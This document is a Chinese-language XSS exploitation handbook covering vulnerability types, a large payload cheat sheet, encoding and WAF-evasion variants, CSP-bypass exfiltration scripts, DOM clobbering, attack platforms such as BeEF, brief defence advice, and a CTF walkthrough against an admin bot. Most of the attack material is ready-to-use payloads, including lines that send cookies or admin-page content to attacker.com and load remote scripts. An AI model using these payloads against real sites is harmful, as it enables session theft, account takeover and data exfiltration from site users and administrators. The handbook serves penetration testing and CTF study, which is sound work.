# EXP手册-Cross-site scripting

## 一句话理解
XSS（Cross-site Scripting）本质是攻击者将可执行脚本注入到受害者浏览器的解析上下文中执行，利用的是用户对目标站点的信任。

## 漏洞分类
### 1. 反射型 XSS
恶意输入进入服务端后立即出现在响应页面中，通常需要用户点击带参数的链接才能触发。

### 2. 存储型 XSS
恶意内容被写入数据库、评论区、个人资料、工单系统、富文本等位置，其他用户访问时会持续触发，危害通常最大。

### 3. DOM 型 XSS
漏洞不一定经过服务端，问题出在前端脚本把不可信数据写入危险 DOM 接口，例如 `innerHTML`、`document.write`、`location` 拼接。

### 4. 基于模板的前端注入
典型是 Client-Side Template Injection（CSTI），模板表达式先被框架执行，再进一步转成 XSS。

## 常见攻击面
- 搜索框、登录失败提示、跳转提示页
- 评论区、留言板、工单、昵称、个性签名
- 富文本编辑器、Markdown 渲染、站内信
- URL 参数回显、`location.hash`、`postMessage`
- 前端路由、SPA 页面模板、第三方组件
- 后台管理系统中的预览、导入、消息通知模块

## 常见利用目标
- 窃取可读的会话数据，如 `localStorage`、页面中的 Token、用户敏感信息
- 冒充受害者发起站内操作，例如改邮箱、加管理员、发帖、转账
- 读取后台页面内容并回传
- 钓鱼、挂马、键盘记录、投递后续利用链
- 与 CSRF、CSP 配置错误、开放重定向等漏洞组合利用

> 注意：`HttpOnly` Cookie 无法直接通过 `document.cookie` 读取，但 XSS 依然可以借助受害者身份执行敏感操作。

## 基础利用
### 1. 最基础的测试载荷
```html
<script>alert('XSS')</script>
```

### 2. 当标签被过滤时
```html
<img src=x onerror=alert(1)>
```

### 3. 当输入落在属性值中
```html
" autofocus onfocus=alert(1) x="
```

### 4. 当输入落在 JavaScript 字符串中
```javascript
';alert(1);//
```

### 5. DOM 型高危 Sink
以下接口一旦写入不可信数据，就很容易形成 XSS：
- `innerHTML`
- `outerHTML`
- `document.write`
- `insertAdjacentHTML`
- `eval`
- `setTimeout(string)`
- `new Function()`

## Payload 速查库

### 1. 基础触发
适用于"输入直接落入 HTML 上下文、可插入新标签"的场景：

```html
<!-- 最经典的脚本标签，也是过滤规则的首要目标 -->
<script>alert(1)</script>

<!-- 图片加载失败自动触发，最常用的备用方案 -->
<img src=x onerror=alert(1)>

<!-- SVG 的 onload 自动触发，无需用户交互 -->
<svg onload=alert(1)>

<!-- body onload：注入点在 body 标签属性或可闭合原标签时使用 -->
<body onload=alert(1)>
```

### 2. 事件类清单
当 `onerror` / `onload` / `onclick` 被过滤时，转向冷门事件（按"是否需要用户交互"分级记忆）：

```html
<!-- 无需交互：autofocus 自动获得焦点 + onfocus -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>

<!-- 无需交互：CSS 动画开始/结束自动触发 -->
<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationstart=alert(1)></xss>
<xss style="animation-name:x" onanimationend=alert(1)></xss>

<!-- 无需交互：媒体加载事件 -->
<video onloadstart=alert(1) src=x></video>
<audio oncanplay=alert(1) src=x></audio>

<!-- 低交互：鼠标悬停 / 移动 -->
<div onmouseover=alert(1)>hover me</div>
<div onpointerrawupdate=alert(1)>move pointer</div>

<!-- 低交互：滚轮 / 拖拽 / 非主键点击 -->
<div onwheel=alert(1)>scroll</div>
<div draggable ondragend=alert(1)>drag me</div>
<div onauxclick=alert(1)>middle click</div>
```

冷门事件速记（10 个）：`onfocus`、`onanimationstart`、`onanimationend`、`onloadstart`、`oncanplay`、`onmouseover`、`onpointerrawupdate`、`onwheel`、`ondragend`、`onauxclick`。

### 3. 标签类
当 `script`、`img`、`svg` 被过滤时，换用其他自带触发条件的标签：

```html
<!-- details：open 属性默认展开，ontoggle 自动触发 -->
<details open ontoggle=alert(1)>

<!-- marquee：开始滚动时自动触发（冷门标签，过滤规则经常漏掉） -->
<marquee onstart=alert(1)>xss</marquee>

<!-- video 内嵌 source：加载失败触发 onerror -->
<video><source onerror=alert(1)></video>

<!-- input 配合 autofocus 自动触发 -->
<input autofocus onfocus=alert(1)>

<!-- 音视频直接加载失败 -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- iframe srcdoc：在属性内嵌子文档，配合实体编码绕过外层过滤 -->
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

<!-- object 加载伪协议资源 -->
<object data="javascript:alert(1)"></object>
```

### 4. 编码绕过
当 `alert`、`javascript:` 等关键字被过滤时，利用不同层级的解码时机：

```html
<!-- HTML 实体编码：属性上下文中浏览器会自动解码实体 -->
<a href="&#106;avascript:alert(1)">xss</a>
<img src=x onerror="&#97;lert(1)">

<!-- 十进制实体完整编码：j=106 a=97 v=118 s=115 c=99 r=114 i=105 p=112 t=116 冒号=58 -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">xss</a>
```

```javascript
// JS Unicode 编码：适用于 JS 代码上下文，解析时还原为标识符
<script>\u0061lert(1)</script>
<script>eval('\u0061lert(1)')</script>
```

```html
<!-- URL 编码：href 中的协议分隔符可编码 -->
<a href="javascript&#58;alert(1)">xss</a>

<!-- 双层 URL 编码：适用于"服务端先解码一次、再输出到 URL 上下文"的二次解码场景 -->
<!-- javascript:alert(1) → %6A%61%76%61%73%63%72%69%70%74%3A... → 再编码一次（% → %25） -->
<a href="%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253Aalert%2528%2531%2529">xss</a>
```

核心原则：编码必须落在"浏览器会在该位置自动解码"的上下文里（属性值、JS 字符串、URL），否则只是普通字符串。

### 5. WAF 对抗变形
针对基于正则/关键词匹配的 WAF，用解析差异和性能问题绕过：

```html
<!-- src 赋异常协议格式：部分 WAF 只匹配 src=x 或 src="..." 的标准形态 -->
<img src=x:x onerror=alert(1)>

<!-- 注释分割标签名：利用 WAF 与浏览器的解析差异，WAF 匹配不到完整标签 -->
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>

<!-- 控制字符分割：标签名/属性之间插入 \x0c（换页符）等空白控制字符 -->
<!-- 提交时需把 \x0c 替换为真实控制字符 -->
<img\x0conerror=alert(1)\x0csrc=x>

<!-- 超长 padding：前置大量垃圾数据，把 payload 推到 WAF 检测长度上限之后 -->
<a href="javascript:/*-<svg/onload=alert(1)>-*/alert(1)">xss</a>
<!-- 或在参数中塞入超长无意义前缀 -->
<img src=x?aaaaaaaa...(数千个a) onerror=alert(1)>

<!-- 大小写混写 + 属性值内换行：破坏大小写敏感与单行正则匹配 -->
<iMg sRc=x OnErRoR=ale
rt(1)>
```

### 6. 标签闭合场景速查表
先判断注入点落在哪个结构里，再按上下文选 payload：

| 注入上下文 | 页面源码形态 | Payload |
| --- | --- | --- |
| input 的 value 属性内 | `<input value="INJECT">` | `" onfocus=alert(1) autofocus>` |
| textarea 文本内 | `<textarea>INJECT</textarea>` | `</textarea><script>alert(1)</script>` |
| JS 单引号字符串 | `var x = 'INJECT';` | `';alert(1);//` |
| JS 双引号字符串 | `var x = "INJECT";` | `";alert(1);//` |
| JS 模板字符串 | var x = `INJECT`; | `${alert(1)}` |
| href 属性值 | `<a href="INJECT">link</a>` | `javascript:alert(1)` |
| HTML 注释内 | `<!-- INJECT -->` | `--><script>alert(1)</script>` |

用法：把 INJECT 替换为对应 payload；若注入点被引号包裹，优先构造 `"` 逃逸属性再注入事件。

## 上下文意识
XSS 是否可利用，核心取决于“输入最终落在哪个解析上下文中”。

### 1. HTML 上下文
重点看是否能闭合标签、插入新标签、触发事件属性。

### 2. HTML 属性上下文
重点看是否能跳出引号，或直接进入事件属性如 `onload`、`onclick`。

### 3. JavaScript 上下文
重点看是否能逃逸字符串、对象字面量、模板字符串或注释。

### 4. URL 上下文
重点看是否可控 `href`、`src`、`action`，以及是否能使用 `javascript:`、`data:` 等协议。

### 5. CSS 上下文
现代浏览器中直接通过 CSS 执行脚本已受较多限制，但仍需关注样式注入、外链加载、旧环境兼容问题。

## 常见绕过思路
### 1. 绕过标签过滤
- 大小写混写
- 利用浏览器容错解析
- 使用非 `script` 标签，如 `img`、`svg`、`iframe`
- 借助事件属性，如 `onerror`、`onload`、`onmouseover`

### 2. 绕过关键字过滤
- 编码变形：HTML 实体、URL 编码、Unicode 编码
- 字符串拼接、模板字符串、大小写拆分
- 利用浏览器自动补全和解析差异

### 3. 无尖括号场景
当 `<`、`>` 被过滤时，优先考虑：
- 属性逃逸
- JavaScript 字符串逃逸
- 模板表达式注入
- 现有 DOM 结构中的事件触发点

### 4. 黑名单绕过
XSS 最忌“黑名单过滤”。常见问题：
- 只过滤 `script`，不处理事件属性
- 只替换一次，导致双写绕过
- 服务端和前端解码次数不一致
- 某些字符被过滤，但可被其他编码方式还原

### 5. 富文本与 Markdown
这类场景经常表现为“看起来做了过滤，但只过滤了少数标签”：
- 允许 HTML 白名单但规则过宽
- 对链接协议校验不足，允许危险协议
- 图片、音视频、公式、代码块渲染链中存在二次注入

## CSP 相关
### 1. 认识 CSP
CSP（Content Security Policy）用于限制页面可加载和可执行的资源来源，是缓解 XSS 的重要机制，但配置错误时仍可被绕过。

同源的判断标准是：协议、域名、端口三者都相同。

- CSP 在线检测工具：https://csp-evaluator.withgoogle.com/
- [同源策略详解及绕过方法](http://zjw.dropsec.xyz/CTF/2016/12/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E8%AF%A6%E8%A7%A3%E5%8F%8A%E7%BB%95%E8%BF%87-%E8%BD%AC.html)

### 2. 常见错误配置
- 使用 `'unsafe-inline'`
- 允许过宽的第三方脚本域
- 把 JSONP、Angular、旧版前端库所在域加入白名单
- `script-src` 限制严格，但忽略了其他可外带数据的资源类型
- 只依赖 CSP，不做上下文输出编码

### 3. 绕过思路
- 借助白名单域上的可控脚本或 JSONP
- 利用现有页面脚本能力，在同源下读取敏感页面
- 通过图片、链接预取、表单、导航等方式带出数据
- 结合 DOM Clobbering、模板注入、前端框架 gadget

### 4. 利用 `<link>` 进行数据外带
下面这个例子是利用同源脚本能力读取内容，再借助 `link prefetch` 外带数据：

```html
<script>
$.get("admin.php", function(data) {
  var content = window.btoa(document.cookie).concat(window.btoa(data));
  var n0t = document.createElement("link");
  n0t.setAttribute("rel", "prefetch");
  n0t.setAttribute("href", "http://***/".concat(content));
  document.head.appendChild(n0t);
});
</script>
```

在此基础上，也可以先请求同源页面，再把页面内容编码后发送出去：

```html
<script>
getText = function(url, callback) {
  var request = new XMLHttpRequest();
  request.onreadystatechange = function() {
    if (request.readyState == 4 && request.status == 200) {
      callback(request.responseText);
    }
  };
  request.open("GET", url);
  request.send();
}
function mycallback(data) {
  var content = window.btoa(data);
  var n0t = document.createElement("link");
  n0t.setAttribute("rel", "prefetch");
  n0t.setAttribute("href", "http://*****/".concat(content));
  document.head.appendChild(n0t);
}
getText("admin.php", mycallback);
</script>
```

## 特殊场景
### 1. Client-Side Template Injection
某些前端框架会先解析模板表达式，再把结果写入页面，最终形成 XSS。

- [XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)

关键词：客户端模板注入、AngularJS、沙箱逃逸、表达式执行。

### 2. 后台管理系统
后台场景通常更值得关注：
- 管理员权限高，单次 XSS 回报更大
- 往往能访问内网接口、工单内容、用户数据
- 常和富文本、日志预览、导入导出、审核流结合

### 3. 第三方脚本供应链
即使业务代码本身没有明显 XSS，若页面允许加载可控第三方脚本，仍可能退化为站点级 XSS。

## DOM Clobbering

### 1. 原理
浏览器有一个历史遗留特性：**带 `id` 或 `name` 属性的 HTML 元素，会自动成为 `window` 对象上的全局变量**（named property access）。如果页面脚本引用了一个"本应存在"的全局变量或对象属性，攻击者就可以用注入的 HTML 元素"顶掉"它，劫持脚本逻辑走向。

特点：
- DOM Clobbering 本身不执行任何脚本，只改变变量解析结果
- 因此常用于"允许 HTML 注入，但 `<script>` / 事件属性被 CSP 拦截"的场景
- 最终能否造成危害，取决于页面是否存在可被劫持的 JS gadget

### 2. 基础 Payload

```html
<!-- 单个元素：window.x 直接指向该 a 元素（真值对象） -->
<a id=x></a>
<!-- 此后 window.x 不再是 undefined，而是 DOM 元素 -->

<!-- form 的命名属性访问：window.x.y 指向 input 元素 -->
<form id=x><input name=y value=1></form>
<!-- window.x.y.value === "1"，可劫持"对象.属性"两级取值 -->

<!-- 覆盖配置对象：两个同名 id 使 window.defaultAvatar 成为 HTMLCollection -->
<!-- 第二个元素带 name=avatar，window.defaultAvatar.avatar 即该元素 -->
<!-- 元素字符串化（String() / 拼接）时返回 href，代码拿到 "cid:xss" -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:xss">
```

对应的受害者代码形态（gadget）：

```javascript
// 开发者假设全局配置一定存在；window.config 未定义时可被注入元素顶掉
let config = window.config || {};
let avatar = config.avatar || "/img/default.png";
// 若 avatar 最终被拼进 img.src 或跳转逻辑，攻击者即可注入 cid:/javascript: 协议
```

### 3. 常见攻击面
- **覆盖配置对象**：代码用 `window.xxx || 默认值` 做兜底，注入元素让其走进攻击者分支
- **覆盖全局变量/函数引用**：脚本引用的 `window.someVar`、`window.utils` 等被顶掉
- **配合 CSP**：`script-src` 拦截了内联与外链脚本，但 HTML 注入未被拦时，Clobbering 是替代利用面
- **配合前端框架 gadget**：老版本 AngularJS、各类 SDK 会读取全局配置项，被 clobber 后进入危险分支
- **伪协议注入**：把配置值劫持为 `cid:`、`data:` 等协议，触发后续 XSS 或跳转漏洞

### 4. 限制与注意
- 现代浏览器中只有 HTML 命名空间元素生效，SVG / MathML 内的元素不会 clobber window
- `document` 上的 named access 已被移除，只能 clobber `window`
- 无法覆盖部分保留属性（如 `window.location`、`window.document`）
- 两个同名元素返回 HTMLCollection，单个返回元素本身，构造时注意目标代码取的是哪一级

## 检测思路
### 1. 手工测试
- 先确认输入是否回显
- 再判断回显位置属于哪种上下文
- 最后按上下文逐步构造最小 payload

### 2. DOM 型排查
重点检索：
- 来源：`location`、`document.URL`、`document.referrer`、`postMessage`
- 去向：`innerHTML`、`eval`、`document.write`、`setAttribute`

### 3. 实战技巧
- 先构造“是否可控”的探针，再构造真正执行逻辑
- 关注浏览器开发者工具中的 DOM 变化
- 关注前端框架二次渲染和客户端路由

## XSS 利用平台与工具

### 1. XSS 平台（xsspt / BeEF）
当 payload 长度受限、目标有 CSP、或需要稳定回传数据时，优先用平台托管：
- **xsspt.com**：国内常用 XSS 接收平台。创建项目后获得平台 URL，注入点只需一行 `<script src="//xsspt.com/xxxx"></script>`；受害者触发后上线，后台可查看 Cookie、页面源码、屏幕截图、物理地址等模块回传
- **BeEF**（Browser Exploitation Framework）：自建平台，功能更全。hook.js 上线后可做键盘记录、内网探测、点击劫持、结合 Metasploit 打浏览器漏洞

使用思路：先手工 `alert(1)` 确认可执行 → 替换为平台脚本地址 → 观察上线情况 → 按需启用模块。CTF 偷 flag 一般用默认模块回传 Cookie，或自建 VPS 接收。

### 2. Burp 插件：XSS Validator
- 从 BApp Store 安装，配合 Headless 浏览器（PhantomJS / Chrome）自动验证 payload 是否真实弹窗
- 流程：Intruder 塞入 payload 字典 → 每条 payload 带唯一验证标记 → Headless 浏览器渲染响应并执行 → 触发 alert 时经 WebSocket 回报 Burp → Intruder 结果直接标出"弹窗成功"的条目
- 适合大范围 fuzz 回显点，省去逐条人工翻响应

### 3. Fuzz 字典
- **PayloadsAllTheThings - XSS Injection**：按上下文分类的 payload 大全，优先从这里挑
- **SecLists**：`XSS.txt`、`XSS-Jhaddix.txt` 等经典模糊测试字典
- 用法：先手工确定注入上下文，再选字典里对应上下文的子集去打，比无脑全量更高效

### 4. 其他常用工具
- **Dalfox**：命令行 XSS 扫描器，支持管道模式与盲打检测（配合 Burp Collaborator）
- **XSStrike**：老牌扫描器，自带 payload 变形与 WAF 指纹识别
- **kxss**：快速筛出"哪些参数的尖括号、引号未被编码"，辅助定位可用注入点

## 防御要点
### 1. 按上下文做输出编码
这是防 XSS 的核心，不是简单的“全局过滤特殊字符”。

### 2. 避免危险 DOM API
尽量使用安全文本接口，如：
- `textContent`
- `innerText`
- 安全模板渲染方案

### 3. 富文本严格白名单
- 标签白名单
- 属性白名单
- 协议白名单
- 防止二次渲染绕过

### 4. 启用 CSP 但不要迷信 CSP
建议结合：
- nonce 或 hash
- 禁止内联脚本
- 限制第三方脚本来源

### 5. Cookie 安全属性
虽然不能根治 XSS，但有助于减轻后果：
- `HttpOnly`
- `Secure`
- `SameSite`

## 案例：存储型 XSS 偷取管理员 Flag（CTF 完整流程）

### 题目背景
博客类 CTF：游客可浏览文章与评论，登录用户可发评论；提示"管理员会定期查看最新评论"（admin bot 每 60 秒访问一次），flag 在管理员会话中。

### 第一步：确认存储型注入点
注册账号，在评论区逐步测试：

```text
评论1：hello world                 → 正常显示，先确认无 WAF 拦截
评论2：<b>test</b>                 → 页面加粗，说明 HTML 未被实体化（富文本渲染）
评论3：<script>alert(1)</script>   → 显示空白，源码中标签被删除（黑名单过滤）
评论4：<img src=x onerror=alert(1)> → 弹窗成功，确认存储型 XSS
```

结论：过滤只黑名单了 `script` 标签，事件属性完全未处理。

### 第二步：摸清过滤规则
继续测边界，确认：
- `script` 标签被删除（是删除不是转义，无双写空间）
- `onerror` / `onload` / `onfocus` 均未被过滤
- 引号、圆括号可用，`document` / `cookie` / `fetch` 关键字未过滤
- 评论长度限制 200 字符，payload 需要精简

### 第三步：确定利用目标
admin bot 定期访问最新评论页，目标：让管理员浏览器执行 JS，回传其 Cookie 或后台数据。

### 第四步：构造回传 payload
方式一：flag 在管理员 Cookie 中（无 HttpOnly）——直接外带：

```html
<img src=x onerror="fetch('//attacker.com/x?c='+document.cookie)">
```

方式二：Cookie 带 HttpOnly，flag 在后台页面——以受害者身份读页面再外带：

```html
<img src=x onerror="fetch('/admin/flag').then(r=>r.text()).then(t=>location='//attacker.com/x?d='+btoa(t))">
```

方式三：payload 超长或含被过滤字符时——两段式"加载器 + 外链"：

```html
<!-- script 被过滤，改用 img 触发后动态加载外链脚本 -->
<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//attacker.com/x.js'">
```

### 第五步：用 XSS 平台托管并收 flag
- 在 xsspt.com 创建项目，得到托管 URL
- 提交评论：`<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//xsspt.com/xxxx'">`
- 等待 admin bot 访问 → 平台后台出现上线记录 → 默认模块回传 Cookie → Cookie 中发现 `flag=ctf{...}`

### 第六步：无 Cookie 场景的收尾
若 flag 只在管理员页面而不在 Cookie：上线后启用平台"网页源码"模块，或让外链脚本先 `fetch('/admin')` 读取后台内容再回传。

### 复盘要点
- 存储型 XSS 的价值在于"受害者可能是管理员"，优先探测后台能力而不是只弹窗
- 黑名单过滤（只删 script）几乎必败，事件属性永远要测
- `HttpOnly` 只挡 `document.cookie`，不挡以受害者身份发请求
- payload 超长时用"加载器 + 外链"两段式结构

## 速查清单
- 先判定类型：反射型、存储型、DOM 型、模板注入
- 先判定上下文：HTML、属性、JavaScript、URL
- 优先找高危 Sink：`innerHTML`、`eval`、事件属性
- 检查富文本、Markdown、后台预览、消息通知
- 检查 CSP 是否存在错误白名单或可利用的同源脚本能力
- 关注 XSS 是否可转化为后台接管、数据外带、内网访问

## Reference
- XSS online 利用平台：https://xsspt.com/
- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- [AMP HTML 关于 XSS 的 CTF Writeup](https://xz.aliyun.com/t/2347)
- [OWASP XSS Filter Evasion Cheat Sheet（cheatsheetseries 新版）](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger - DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
